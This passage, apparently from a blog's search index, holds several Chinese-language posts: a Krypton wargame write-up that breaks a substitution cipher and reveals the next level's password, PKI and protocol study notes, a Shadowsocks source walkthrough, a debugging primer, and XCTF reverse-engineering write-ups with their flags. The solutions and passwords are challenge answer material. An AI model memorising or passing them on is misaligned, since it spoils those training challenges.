MNUSQ ENSQJ YNCPS CGQUZ CSGJC XCZYB CGJBX ICSKJ DSNSK SNSJK BNBMG WAVQZ FUYBJ UGSQN BGSSO JNSTC JLBXJ DSAQZ FQGWQ VBGEB GSGSQ NJDSB JDSNJ DSUZQ VSUKS NSSOZ SSWCG EVLDQ NWQGW EVBUU LKCJD QVVJD SQYYS QNQGZ SBXAM NGCUD SWEBV WJDSK SCEDJ BXJDS CGUSZ JKQUI SNLNS TQNFQ AVSQG WJQFC GEQVV JDCGE UCGJB ZBGUC WSNQJ CBGCZ BMVWD QNWVL AVQTS RMYCJ SNXBN DCUBY CGCBG NSUYS ZJCGE CJ krypton3@krypton:/krypton/krypton3$ cat HINT1 Some letters are more prevalent in English than others. krypton3@krypton:/krypton/krypton3$ cat HINT2 \"Frequency Analysis\" is your friend. krypton3@krypton:/krypton/krypton3$ krypton3@krypton:/krypton/krypton3$    https://www.jianshu.com/p/a131136c0dbf\n # 25char 257: (space) 155: S 107: C 106: Q 102: J 100: U 87: B 81: G 74: N 69: D 57: Z 56: V 47: W 42: Y 32: T 29: X 29: M 27: L 25: K 20: A 17: E 11: F 7: O 2: I 2: H 1: R # 26char 354: (space) 243: S 186: Q 158: J 135: N 130: U 129: B 119: D 111: G 86: C 66: W 59: Z 53: V 45: M 37: T 34: E 33: Y 33: X 30: K 27: L 26: A 14: I 12: F 3: O 2: R 2: H 1: P # 25char 93: (space) 58: S 48: Q 41: J 35: G 34: C 31: N 30: B 27: U 22: D 21: V 16: Z 16: W 13: E 12: M 12: K 9: Y 9: X 9: A 6: T 6: L 5: F 3: I 2: O 1: R 1: P 假如把所有综合一起统计\n703: (space) 456: S:e 340: Q:t 301: J:a 257: U:o 246: B:i 240: N:n 227: G:s 227: C:h 210: D:r 132: Z:d 130: V:l 129: W:c 86: M:u 84: Y:m 75: T:w 71: X:f 67: K:g 64: E:y 60: L:p 55: A:b 28: F:v 19: I:k 12: O:j 4: R:x 4: H:q 2: P:z 把上述词频带入解开，貌似也不是密码啊\n1 2 3  krypton3@krypton:/krypton/krypton3$ cat krypton4 KSVVW BGSJD SVSIS VXBMN YQUUK BNWCU ANMJS gellc isear eleke lfiun mtoog incho bnuae    http://www.richkni.co.uk/php/crypta/freq.php\nhttp://www.simonsingh.net/The_Black_Chamber/hintsandtips.html\n 我疯了，做法没问题，但据说只能一个个试，直接找到了题解\nsecret: A B C D E F G H I J K L M N O P Q R S T U V W X Y Z text: B O I H G K N Q V T W Y U R X Z A J E M S L D F P C 用命令替换得到密码\n1  $ cat krypton4 | tr '[A-Z]' '[BOIHGKNQVTWYURXZAJEMSLDFPC]'   1 2 3  krypton3@krypton:/krypton/krypton3$ cat krypton4 | tr '[A-Z]' '[BOIHGKNQVTWYURXZAJEMSLDFPC]' WELLD ONETH ELEVE LFOUR PASSW ORDIS BRUTE krypton3@krypton:/krypton/krypton3$   ","description":"","tags":["ctf","wargame"],"title":"CTF-Wargame","uri":"/posts/ctf-wargame/"},{"categories":["crypto"],"content":"Security Protocols and Standards\n--PKI Principles and technology\n 安全协议与标准 * PKI concepts/content/significance * Core PKI Service * Certificate and CRL(证书吊销列表) * Trust Model * PKCS：The Public-Key Cryptography Standards * CA(证书认证中心：Certificate Authority) Standards * PKI Security Protocols：SMIME，SSL，SET(安全电子交易协议)，VPN * PKI/CA Design and Implementation * Related Laws * \\* Bitcoin \u0026 BlockChain 1.Review to Cryptography  Security Requirment(安全需求)  Confidentiality(机密性)：防止被未授权人员读取信息 Integrity(完整性)：保持数据一致完整 Availability(可用性)：保持数据可用 Authentication(认证性)：保证人的身份正确 Non-repudiation(抗抵赖性)：确保数据不会被否定 Access control(访问控制)：防止未授权人员访问  前三个被称为信息安全的CIA三要素\n 攻击的类型 攻击分为两种类型：主动攻击和被动攻击\n 被动攻击(Passive attack)：只能观察到流量或数据 主动攻击(Active attack)：可以主动修改流量或数据，比如中间人攻击。通常比较难实现，但是攻击十分有效，比如邮件的伪造，TCP/IP spoofing（IP欺骗），session hijacking（会话劫持）  安全服务 ISO7498-2中定义了5大类可选的安全服务：\n 认证性 访问控制 数据保密性 数据完整性 不可否认性  安全机制 三大基本设施\n Encryption(加密) Digital signatures(数字签名) Checksums/hash algorithm(校验码/哈希算法)  一种安全服务可能结合多种安全机制\nSecurity Protocol 一种安全协议里包含一个或多个安全服务，而安全服务提供多种安全机制，在一个安全机制里可能用到多种算法（机制由算法实现），这就是协议与服务、机制、算法之间的关系\n对称加密由加密过程可分为：流加密(Stream cipher)和块加密(Block cipher)\nKey Distribution Center(KDC)：密钥分发中心\n块加密方式  Electronic Code Book(ECB) Cipher Block Chain(CBC) Cipher Feed Back(CFB) Output Feed Back(OFB) Counter(CTR)  公钥应用  加解密 数字签名 密钥交换  算法  RSA DH：key exchange algorithm Elgamal DSA  对称加密vs非对称加密 对称加密  优点  速度快、处理量大，适用于对应用数据的直接加密 加密密钥长度短，一般为40bit至128bit 还可以构造各种加密体制，如产生伪随机数、hash函数   缺点  密钥在双方都要一致、保密，传递较难 大型网络中密钥量大，难以管理，一般需要TTP 密钥需要经常更换    非对称加密  优点  只有私钥保密，公钥公开 网络上的密钥管理只需要一个功能性TTP，而不是一个绝对安全的TTP，不需在线，可以离线 密钥生命周期相对较长 许多公钥方案可以产生数字签名机制 在大型网络上，所需的密钥相对较少   缺点  速度慢、处理量少，适用于密钥交换 密钥长度相对较长 安全性没有得到理论性证明 历史较短    哈希函数 弱碰撞：给定x，寻找y，使得H(y) = H(x)\n强碰撞：寻找x，y，使得H(y) = H(x)\nMessage Authertication Code(MAC) 消息认证码MAC\n数字签名（Digital Signature） Key Management 密码学最难的部分\n密钥分为两种\n Short-term session keys(ephemeral keys) Long-term keys  认证 加密    主要问题  Distributing keys(分发密钥)  获取其他人的公钥 分发自己的公钥   Establishing a shared key with another party(与另一方建立共享密钥)  保密性 认证性   Key storage  安全存储密钥   Revocation  Revoking published keys：撤销公钥 Determining whether a published key is still valid：验证公钥的可用性    Key Lifetime and Key Compromise 公钥有着更长的生命周期(decades)\n私钥或者传统密钥有着更短的生命周期(a year or two)\nKey Distribution Problem ！中间人攻击\n解决办法：CA（Certification authority）\n 对称加密密钥管理认证：KDC/KEY DISTRIBUTION CENTER 非对称加密密钥管理认证：CA/CERTIFICATE AUTHORITY  Data Format 一种正确的加密内容的格式如下图所示\nPGP和S/MIME，SSL，SSH的格式不同于他们的 bit-bagging format\nSecurity Protocol：Layers 层次越高，就越容易部署应用；层次越低，数据就越透明\nPKI（Public Key Infrastructure） Internet安全系统解决方案，PKI采用数字证书机制管理公钥，通过第三方可信机构CA，把用户的公钥和身份信息进行有效捆绑，在Internet上有效验证用户的身份\n国际标准PKIX：系统化、标准化\nPKIX系列标准(Public Key Infrastructure on X.509)是由因特网网络工程技术小组的PKI小组制定，PKIX的标准化是建立互操作的基础。标准主要定义基于X.509的PKI框架模型，并以RFC形式发布\n 安全：可靠性==》可靠性（网课的可靠性和安全性，没有可靠性，安全性没用）\n安全协议与标准\n协议：至少两方参与\n网络协议的三要素：语法、语义、同步\n围绕PKI的相关协议和理论\nPKI：安全基础设施：Public Key Infrastructure\n 基础设施协议 应用的协议   参考书：\nPKI技术，荆继武，冯登国，科学出版社（偏理论\nPKI原理与技术，谢冬青，清华大学出版社\nPKI/CA与数字证书技术大全，张明德，刘伟，电子工业出版社（偏实践\n  可靠性和安全性的区别，其两者之间的包含性\n面对问题需要系统的方法\n   环境安全\n  物理安全\n  物理网路\n  平台可靠性\n   安全——木桶理论\n安全：生态的概念\n蝴蝶效应\n黑天鹅理论\nCIA三定理\n被动攻击\u0026主动攻击\n 被动攻击：可以监控数据 主动攻击：可以修改数据  属性证书\n身份证书\n两者结合解决身份认证问题\n协议：至少两方，交互信息、有限交互\n怎么打padding\n 公钥算法的功能\n  加解密：保密性\n  数字签名：认证性\n  密钥交换：密钥管理\n  RSA：数字签名加解密\n  DH：密钥交换\n  Elgamal\n  DSA：基于离散对数的\n  椭圆曲线\n   IPV4，网络低层没有考虑安全\n我国IPv4的地址匮乏，主网模式下大量NAT、内网穿透的使用，大力推广IPV6\nPKI：Public Key Instruction\n密码学五大奠基：\n 对称密码 公钥加密 数字签名 HASH MAC  协议：网络协议\u0026应用协议\n报告：中国PKI技术和应用发展，调研\n网站学习：技术体术标准化，商密SM系列标准\n报告：综述、涉及了什么\nddl:10day\n 网络安全基础设施  提供网络安全基本框架，可以被组织内任何需要安全服务的应用和对象使用 接入点统一的，便于使用  安全登录（认证） 认证：确认一个实体确实是其向其他人声明的\n用户标识\u0026认证信息\u0026防止口令截取\u0026监听\u0026重放攻击\n选择好口令：长度，质量，经常修改\n口令不再网络上直接传输\n   认证： ①Kerboeros：纯密码 基于用户名/口令 ②数字证书\n  授权：是一个访问控制问题 对资源控制\n   Kerberos\n X.509 Certificate 数字证书的合法有效性验证包含\n 签名验证：自签名证书  ...\n 证书链   PKI服务的突出优势  节省费用 企业内部互操作性\u0026企业间互操作性 一致的解释方案（兼容性） 实际安全性（标准化\u0026成熟性） 安全服务提供者的选择（可度量\u0026可靠性\u0026认证管理）   PKI服务的不可否认性实现\n 数字签名+时间戳服务 证据（原始数据+签名信息+密钥+时间戳）  PKI Architecture PKI架构\nApplication：常规系统软件，如数据库、操作系统、Webserver\n结合网络的分层结构\n可以层层叠加的\nCryptographic Primitives：代码签名：CSP，Microsoft CryptoAPI 2.0\n PKCS#标准列表\n 课程复习总结\n  密码基础知识部分   安全需求：五方面：Confidentiality Integrity Authentication Non-repudiation Access_Control\n密码算法——上升到——协议\n密码算法与协议的层次关系\n密码算法：机制（加密机制（对称加密机制、公钥加密机制、古典密码机制））\n算法：逼迫计算破解\n   对称加密：代替\u0026置换\n DES：  DES-\u003eAES的演化：效率的进化 安全性主要集中在：密钥长度过短2^56 有攻击手段   AES：  2^128 、2^256，可变      公钥加密\n RSA  1024bit还是安全的 1024-N=p*q   ECC  需要的密钥更短，安全性更强（160bit密钥达到1024bit rsa的安全性）       区别\n 公钥加密基于困难问题，具备理论安全 量子计算：计算复杂，减少指数级复杂度 冯诺依曼计算机结构：解决多项式算法的问题 特点比较，决定使用环境不同     数字签名，原理\n哈希函数，MAC函数（带有密钥的哈希函数）：常规应用功能\n协议：解决实际应用的某些问题\n协议和算法的区别，协议：两方、多方协调通信，算法：一方\nSSL协议\n密钥管理问题：Key Distribution\n Kerbers 协议：  协议提出背景 协议的核心技术：口令、完全采用对称加密 集成的安全应用的安全需求，解决了什么需求 SSO单点登陆：解决信息孤岛、访问控制问题 如何解决三个层次：TGS、应用服务器、用户 票据：对称加密 保证票据安全：不会被重放 认证子，认证元素 效率、方便性相关： 多个协议环：减少认证服务器的压力、集中式变分布式    密钥协商机制，解决对称算法密钥交换问题（Key Agreement）\n公钥数字证书\nX509证书规范\n数字证书自身的验证\nCRL的构造原理：周期性的\nOCSP协议工作原理：有效性和安全性\n证书吊销\nCRL和OCSP的对比、安全风险（在哪，怎么弥补）\n安全服务\n证书管理服务：\nPKI框架：有什么用、解决啥问题\nCA架构\n属性证书\nPKI架构图\nPKI系统结构组成\nCA认证结构——信任模型\n编码问题：\n抽象语法注解：ASN.1（无二义性）\nDER编码：基本规则**，能编码解码**\n信任模型：基于CA、数字证书认证中心的模型\nPKCS标准列表\n数字信封\nCP和CPS的关系\nKerberos\nSSL/TLS\nIPSEC\nPGP\n","description":"","tags":["studyNote"],"title":"Security-Protocols-and-Standards","uri":"/posts/security-protocols-and-standards/"},{"categories":["web"],"content":"关于ShadowSocks的学习 对待科学上网的工具，既然开源的话，就要有科学的精神对其进行学习。\n其GitHub官方网址：https://github.com/shadowsocks\n本文学习的源码来自：https://github.com/shadowsocks/shadowsocks\n版本是2.9.1的python版本\n 参考：\nshadowsocks 源码分析：整体结构\n你也能写个 Shadowsocks\nshadowsocks源码分析：ssserver\nshadowsocks 源码阅读\nShadowsocks 源码分析——协议与结构\nshadowsocks客户端源码分析\n 这个世界上不应该仅有一种声音。\n但是。。。\n关于SOCKS协议 ShadowSocks的数据传输时建立在SOCK5协议之上，SOCKS5 是 TCP/IP 层面的网络代理协议。\nss-server 端解密出来的数据就是采用 SOCKS5 协议封装的，通过 SOCKS5 协议 ss-server 端能读出本机软件想访问的服务的真正地址以及要传输的原数据\n 关于Socks5学习：\nsocks5 协议简介\nHTTP协议和SOCKS5协议\nsocks-wiki\nrfc1928\nrfc1929\n socks是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。根据OSI七层模型来划分，SOCKS属于会话层协议，位于表示层与传输层之间。\nsocks5协议将socks4协议扩展：\n 对UDP连接的支持 多种用户身份验证方式和通信加密方式 将寻址方式扩展为包含域名和v6 IP地址（即IPv6）  socks协议的设计初衷是在保证网络隔离的情况下，提高部分人员的网络访问权限。但是他却被发现了新的用途：突破网络通信限制，这和该协议的设计初衷正好相反。\nSocks5协议流程 建立TCP连接后，客户端需要先发送请求来协商版本及认证方式，详细可见rfc1928\nShadowsocks原理  PC是需要利用shadowsocks代理的应用； SS Local：为shadowsocks客户端，通常运行在PC/手机上（也可以运行在任务PC可 以到达的位置），用于与shadowsocks服务端建立连接。 GFW：你懂的 ss server：shadowsocks服务端，与ss local通讯，完成ss local请 求的访问，并将返回数据加密返回给ss local  混淆时实在ClientHello阶段，即第1阶段时进行混淆，加入jiade目标网址\nshadowsocks源码分析 shadowsocks文件树形结构图如下\n ├── .gitignore ├── .travis.yml ├── CHANGES ├── CONTRIBUTING.md ├── debian │ ├── changelog │ ├── compat │ ├── config.json │ ├── control │ ├── copyright │ ├── docs │ ├── init.d │ ├── install │ ├── rules │ ├── shadowsocks.default │ ├── shadowsocks.manpages │ ├── source │ │ └── format │ ├── sslocal.1 │ └── ssserver.1 ├── Dockerfile ├── LICENSE ├── MANIFEST.in ├── README.md ├── README.rst ├── setup.py ├── shadowsocks │ ├── asyncdns.py │ ├── common.py │ ├── crypto │ │ ├── __init__.py │ │ ├── openssl.py │ │ ├── rc4_md5.py │ │ ├── sodium.py │ │ ├── table.py │ │ └── util.py │ ├── daemon.py │ ├── encrypt.py │ ├── eventloop.py │ ├── __init__.py │ ├── local.py │ ├── lru_cache.py │ ├── manager.py │ ├── server.py │ ├── shell.py │ ├── tcprelay.py │ └── udprelay.py ├── tests ├─tests │ ├── aes-cfb1.json │ ├── aes-cfb8.json │ ├── aes-ctr.json │ ├── aes.json │ ├── assert.sh │ ├── chacha20-ietf.json │ ├── chacha20.json │ ├── client-multi-server-ip.json │ ├── coverage_server.py │ ├── fastopen.json │ ├── gen_multiple_passwd.py │ ├── graceful.json │ ├── graceful_cli.py │ ├── graceful_server.py │ ├── ipv6-client-side.json │ ├── ipv6.json │ ├── jenkins.sh │ ├── nose_plugin.py │ ├── rc4-md5-ota.json │ ├── rc4-md5.json │ ├── salsa20-ctr.json │ ├── salsa20.json │ ├── server-dnsserver.json │ ├── server-multi-passwd-client-side.json │ ├── server-multi-passwd-empty.json │ ├── server-multi-passwd-performance.json │ ├── server-multi-passwd-table.json │ ├── server-multi-passwd.json │ ├── server-multi-ports.json │ ├── setup_tc.sh │ ├── table.json │ ├── test.py │ ├── test_command.sh │ ├── test_daemon.sh │ ├── test_graceful_restart.sh │ ├── test_large_file.sh │ ├── test_udp_src.py │ ├── test_udp_src.sh │ ├── workers.json │ │ │ ├─libsodium │ │ └── install.sh │ │ │ └─socksify │ ├── install.sh │ └── socks.conf | └── utils ├── autoban.py ├── fail2ban │ └── shadowsocks.conf └── README.md 有过python工程经验（类似于Flask）很明显得知，工程核心代码位于shadowsocks里，其他提供了打包测试功能。\n对于核心代码：\n├── shadowsocks │ ├── asyncdns.py │ ├── common.py │ ├── crypto │ │ ├── __init__.py │ │ ├── openssl.py │ │ ├── rc4_md5.py │ │ ├── sodium.py │ │ ├── table.py │ │ └── util.py │ ├── daemon.py │ ├── encrypt.py │ ├── eventloop.py │ ├── __init__.py │ ├── local.py │ ├── lru_cache.py │ ├── manager.py │ ├── server.py │ ├── shell.py │ ├── tcprelay.py │ └── udprelay.py  tcprelay.py提供了类TCPRelay, TCPRelayHandler来处理TCP代理连接 udprelay.py提供了类UDPRelay，UDPRelayHandler来处理UDP代理连接 eventloop.py提供了类EventLoop对epoll, kqueue, select方法的包装，提供统一的IO复用接口 encrypt.py提供加密解密相关接口  具体的加密实现在crypto文件夹中实现   daemon.py：用于实现守护进程； shell.py：读取命令行参数，检查配置 common.py包含一些通用接口 lru_cache.py：实现了LRU缓存 server.py是服务端入口ssserver； local.py是客户端入口sslocal；  可以看到，基本每个文件中，都有这一行的引入模块\n1 2  from __future__ import absolute_import, division, print_function, \\ with_statement   这个模块是为了引入下一版本的python特性，提高代码对最新python版本的兼容性。\n在setup.py中可见，该代码可在python2.6，python2.7以及python3.3，python3.4及以上版本运行，因此会引入该库来解决兼容性问题\n主要是为了兼容import ，除法/，print，with\n  about __future__：\nhttps://www.liaoxuefeng.com/wiki/897692888725344/923030465280480\n  import  https://blog.csdn.net/caiqiiqi/article/details/51050800\nPython 2.4或之前, Python会先查找当前目录下有没有string.py, 若找到了，则引入该模块，然后你在main.py中可以直接用string了。\n而引入absolute_import 可以先从系统库中引用。\n /  python2中，/为整除，而python3中，整除是//。\n print  python2中，print是一个语法结构，而python3中，print是一个内置函数，有多个参数\n即明显地，python2中，print 'hello world'；而在python3中，print('hello world')\n with  http://www.voidcn.com/article/p-wrgsfqdl-boq.html\npython2.5需要引入的语法，没有看到2和3有什么区别，应该是为了兼容所引入的。\n在stackoverflow的一个问题里说的很清楚了：https://stackoverflow.com/questions/3791903/which-python-version-needs-from-future-import-with-statement\nversion\u003c=2.4不支持，version2.5需要这个import with_statement，在version\u003e=2.6的时候，python已经将with内嵌进去了。\n Crypto openssl.py from ctypes import ...：ctypes是python和C的桥梁，ctypes是python标准库之一，里面引入了许多C的函数以及变量类型\n https://www.cnblogs.com/gaowengang/p/7919219.html\n __all__ = ['cipher']规定了对外暴露的接口\n https://www.cnblogs.com/wxlog/p/10566628.html\n 由此直接看到下面的cipher，里面定义了ss的加密方法\n这也就是crypto模块对外提供的所有加密方法\ndef load_openssl()方法用来寻找运行系统中的openssl库\n全局变量libcrypto用来存放打开的openssl对象\n定义了一个OpenSSLCrypto对象用来加密\n函数def run_method(method)用来调用该对象进行加解密\n然后下面有一堆的test函数\nrc4_md5.py 直接调用hashlib模块的md5进行运算，没啥好说的\nsodium.py soudium是钠的意思，好像也是在英语中代表着纯盐\n https://blog.abyss.moe/archives/24/\nhttps://github.com/jedisct1/libsodium\n 但是查了下libsodium是一个新的软件库，为了加解密、签名、哈希等。是一个现代的密码库，着重于移植性、安全性，是NaCl(Networking and Cryptographt library)的一个分支==\u003ehttp://nacl.cr.yp.to/\n这里面也是实现了三种加密（都没听过，往后有时间可以了解一下\nutil.py 基本在Crypto文件夹下的所有文件基本都引用了这个模块\n这模块提供了①查找dll库的函数：def find_library_nt(name)、def find_library(possible_lib_names, search_symbol, library_name) ②测试加解密函数：def run_cipher(cipher, decipher) ③检验引入的库是否存在：def test_find_library()\n其main函数主要是为了检测是否引入所有所需的dll库，所以引入这个模块可确保其他编写加密的文件不会出现无法调用库的情况\ntable.py 好像是一种单表替换加密\n__init__.py 一个很正常的init文件，跟crypto的_init_.py差不多\nasyncdns.py 从文件名就可以看出，这是一个异步的DNS查询\n其文件里提到了rfc1035，即DNS协议\n1 2 3 4 5 6 7 8 9  # 规定了hostname的格式 VALID_HOSTNAME = re.compile(br\"(?!-)[A-Z\\d\\-_]{1,63}(?\u003c!-)$\", re.IGNORECASE) # 以及后面对hostname的判断 def is_valid_hostname(hostname): if len(hostname) \u003e 255: return False if hostname[-1] == b'.': hostname = hostname[:-1] return all(VALID_HOSTNAME.match(x) for x in hostname.split(b'.'))   以下是该文件里对DNS协议写的一些通用的工具类函数用于解析地址、回应等，以及构造地址和请求\n1 2 3 4 5 6 7  def build_address(address) def build_request(address, qtype) def parse_ip(addrtype, data, length, offset) def parse_name(data, offset) def parse_record(data, offset, question=False) def parse_header(data) def parse_response(data)   采用了class DNSResponse(object)这个类来存储DNS回应，即目标的hostname、请求、以及answer\nclass DNSResolver(object)类实现了简单的异步查询DNS，其中异步缓存采用了LRUCache的方式（具体实现在lru_cache.py中）\n核心处理方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  # 只有可读事件 def handle_event(self, sock, fd, event): # 防御性编程，实际上是个无用的判断 if sock != self._sock: return if event \u0026 eventloop.POLL_ERR: # 当错误发生时,重新初始化sock logging.error('dns socket err') # 从事件循环中移除 slef._sock self._loop.remove(self._sock) self._sock.close() # TODO when dns server is IPv6 # 初始化sock self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.SOL_UDP) self._sock.setblocking(False) # 重新加入事件循环 self._loop.add(self._sock, eventloop.POLL_IN, self) else: ''' 读取一个 UDP 包，并取出前 1024 个字节 注意：如果一个 UDP 包超过 1024 字节，比如：2048 字节。 一次 recvfrom(1024) 也会消耗整个 UDP 包。这里是认为 DNS 查询返回的 UDP 包都不会超过 1024 字节。 ''' data, addr = sock.recvfrom(1024) if addr[0] not in self._servers: logging.warn('received a packet other than our dns') return self._handle_data(data)   common.py 该文件提供了都是些工具类的函数，如bytes和str的互相转化（python2中bytes属于str类）、是否是ip\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  # ip地址转换函数 # 数值格式(numeric):存储地址的二进制格式 # 点分十进制:就是我们常见的ip(192.168.1.1) def inet_pton(family, addr) # 将点分十进制的ip地址转化为用于网络传输的数值格式 def inet_ntop(family, ipstr)# 将数值格式转化为点分十进制的ip地址格式 # 大概某个版本前的socket没有ip地址转换函数 def patch_socket(): if not hasattr(socket, 'inet_pton'): socket.inet_pton = inet_pton if not hasattr(socket, 'inet_ntop'): socket.inet_ntop = inet_ntop def pack_addr(address) # 打包地址 def parse_header(data) # 解析socket5头部 class IPNetwork(object) # 初始化网络列表   daemon.py encrypt.py ","description":"","tags":["ssr","vpn","networks"],"title":"ShadowSocks-SourceCode-Learning","uri":"/posts/shadowsocks-sourcecode-learning/"},{"categories":["reverse"],"content":"Debug 入门 在以前打ACM的时候，debug全靠printf和大脑跑程序，但是现在做逆向的时候发现了debug的新知识。\n单步调试 现在基本主流的IDE都提供了debug模式，其中step into，step over，step out是三个主流的函数，也是ollydbg动态调试中最重要的武器。\n其中概念如下：\n  step into：Step to the next line excuted（F7） 单步执行，遇到子函数就进入并且继续单步执行（简而言之，进入子函数）；\n  step over：Step to the next line in this file（F8） 在单步执行时，在函数内遇到子函数时不会进入子函数内单步执行，而是将子函数整个执行完再停止，也就是把子函数整个作为一步。有一点,经过我们简单的调试,在不存在子函数的情况下是和step into效果一样的（简而言之，越过子函数，但子函数会执行）。\n  step out：Step to the first line executed after returning from this method 当单步执行到子函数内时，用step out就可以执行完子函数余下部分，并返回到上一层函数。\n  简单来说，step into就是逐行运行，当碰到函数时，会进入函数内部进行执行；而step over是直接执行到断点处，即不会每行都停下来；step out 是在执行到子函数的任意部分时，使用该函数会直接执行到该函数的返回语句，但是如果子函数剩下部分仍有断点，则执行到断点部分停下。\n在看《有趣的二进制》时，发现了一个简洁的解释：\n Step into：跳入：调用函数时进入函数内部 Step over：跳出，调用函数时不进入函数内部，将函数作为一条指令来执行  （可以直接在pycharm进行实验，实验代码如下）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  #!/usr/bin/env python # -*- coding:utf-8 -*- def add(a, b): c = a + b return c def divide(a, b): c = a / b return c def debug_test(): x = 8 y = 2 sum = add(x, y) d = divide(x, y) print(sum, d) return 0 if __name__ == '__main__': ans = debug_test() print(ans)   Ollydbg 在OD中：\n Step into：F7：执行一句OP code，若遇到CALL，进入函数代码内部 Step over：F8：执行一句OP code，若遇到CALL，仅执行函数自身，不跟随进入  visual studio的调试：https://blog.csdn.net/boylinux/article/details/7659759\n在visual studio里，F11为step into，F10为Step over\n汇编语言：跳转指令  参考：https://blog.csdn.net/weibo1230123/article/details/84236308\n ARM的跳转指令如下\n 无条件跳转: JMP; 根据 CX、ECX 寄存器的值跳转: JCXZ(CX 为 0 则跳转)、JECXZ(ECX 为 0 则跳转); 根据 EFLAGS 寄存器的标志位跳转  根据标志位跳转的指令如下：\nJE ;等于则跳转 JNE ;不等于则跳转 JZ ;为 0 则跳转 JNZ ;不为 0 则跳转 JS ;为负则跳转 JNS ;不为负则跳转 JC ;进位则跳转 JNC ;不进位则跳转 JO ;溢出则跳转 JNO ;不溢出则跳转 JA ;无符号大于则跳转 JNA ;无符号不大于则跳转 JAE ;无符号大于等于则跳转 JNAE ;无符号不大于等于则跳转 JG ;有符号大于则跳转 JNG ;有符号不大于则跳转 JGE ;有符号大于等于则跳转 JNGE ;有符号不大于等于则跳转 JB ;无符号小于则跳转 JNB ;无符号不小于则跳转 JBE ;无符号小于等于则跳转 JNBE ;无符号不小于等于则跳转 JL ;有符号小于则跳转 JNL ;有符号不小于则跳转 JLE ;有符号小于等于则跳转 JNLE ;有符号不小于等于则跳转 JP ;奇偶位置位则跳转 JNP ;奇偶位清除则跳转 JPE ;奇偶位相等则跳转 JPO ;奇偶位不等则跳转 ","description":"","tags":["debug","reverse"],"title":"Debug-Introduction","uri":"/posts/debug-introduction/"},{"categories":["reverse"],"content":"Reverse\u0026WriteUp 开始入坑逆向，请多多指教！\n攻防世界\u0026Crypto新手练习区 0x01 insanity  题目描述：菜鸡觉得前面的题目太难了，来个简单的缓一下\n 下下来一个文件，本着好奇心直接用notepad打开，就看到了FLAG：9447{This_is_a_flag}？？？\n原本我只想看看文件头的，没想到直接看到了FLAG\n看到文件头得知，这是一个ELF文件\n拖进IDA逆向，直接看main函数，没啥发现，然后F5得源码\n心想着这哪有关于flag得信息，于是点v4到字符串到，看到了静态flag字符串，得到flag\n看着这个字符串，应该是一个挺好玩得游戏\n0x02 Open-source  题目描述：菜鸡学逆向学得头皮发麻，终于它拿到了一段源代码\n 如题，直接拿到源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  #include \u003cstdio.h\u003e#include \u003cstring.h\u003e int main(int argc, char *argv[]) { if (argc != 4) { printf(\"what?\\n\"); exit(1); } unsigned int first = atoi(argv[1]); if (first != 0xcafe) { printf(\"you are wrong, sorry.\\n\"); exit(2); } unsigned int second = atoi(argv[2]); if (second % 5 == 3 || second % 17 != 8) { printf(\"ha, you won't get it!\\n\"); exit(3); } if (strcmp(\"h4cky0u\", argv[3])) { printf(\"so close, dude!\\n\"); exit(4); } printf(\"Brr wrrr grr\\n\"); unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207; printf(\"Get your key: \"); printf(\"%x\\n\", hash); return 0; }   推测得知，hash应该就是所得字符串\n该函数有4个判断，因为每个判断都和后面的hash计算有关，因此阅读每个if判断\n第一个判断是否为四个参数，第二个判断first是否为0xcafe，因为first被强转为int，因此需将十六进制转化为十进制，这边用python偷懒，算出为51966，第二个判断要过，即或运算两边都需要false，因此 second满足的条件为：second %5 != 3 \u0026\u0026 second %17 == 8，最后一个判断即是c++的字符串比较，直接输入h4cky0u。\n用gcc将程序编译，得到可执行文件，运行以上结果，得到flag：c0ffee\n0x03 simple-unpack  题目描述：菜鸡拿到了一个被加壳的二进制文件\n 获得一个加壳的ELF文件，拖入IDA64bit里，果然没法分析\n学一波脱壳\n 参考：\nhttps://bbs.ichunqiu.com/thread-22463-1-1.html?from=beef\nhttps://www.jianshu.com/p/0880bcb6fed6\n 用DetectItEasy查出这是upx壳\n 上52pojie.cn找ELF64脱UPX壳\nhttps://www.52pojie.cn/thread-1048649-1-1.html\nhttps://www.52pojie.cn/forum.php?mod=viewthread\u0026tid=730499\u0026page=1\n 透了，之后补充upx手脱\n发现可以用命令脱壳，然后拖入IDA即可看到源码\n1  $ upx -d simple-unpack   ","description":"","tags":["ctf","reverse"],"title":"XCTF-adworld-reverse-wp","uri":"/posts/xctf-adworld-reverse-wp/"},{"categories":["database"],"content":"数据库系统概念 引言 DBMS定义：由一个相互关联的数据集合和一组用以访问这些数据的程序组成，这个数据集合同城称作数据库(Database)。\nDBMS的目标：方便、高效地存取数据库信息\n 四个基本概念  数据（Data） 数据库（Database） 数据库管理系统（DBMS） 数据库系统（DBS）    数据 数据（Data）是数据库中存储的基本对象\n数据的定义：描述事物的符号记录\n数据的种类：文字、图形、图像、声音\n数据的特点：数据与其语义是不可分的\n！数据的形式不能完全表达其内容\n数据结构 逻辑结构：数据之间存在的逻辑关系，如表、树、图、数组等\n物理结构：数据在计算机内的存储方式，如顺序方式、链接方式\n数据库 数据库（Database，简称DB）是长期储存在计算机内、有组织的、可共享的大量数据集合\n数据库的特征  数据按一定的数据模型组织、描述和储存 可为各种用户共享 冗余度较小 数据独立性较高 易扩展  数据库管理系统 数据库管理系统（Database Management System，简称DBMS）由一个相互关联的数据的集合和一组用以访问这些数据的程序组成，是位于用户与操作系统之间的一层数据管理软件。\n用途：科学地组织和存储数据、高效地获取和维护数据\n 数据定义功能：提供数据定义语言（DDL），定义数据库中的数据对象 数据操作功能：提供数据操纵语言（DML），操纵数据实现对数据库的基本操作（增删改查） 数据库的运行管理：保证数据的安全性、完整性，保证多用户对数据的并发使用，发生故障后的系统恢复 数据库的建立和维护功能：数据库数据批量装载，数据库转储，介质故障恢复，数据库的重组织，性能监视  数据库系统 数据库系统（Database 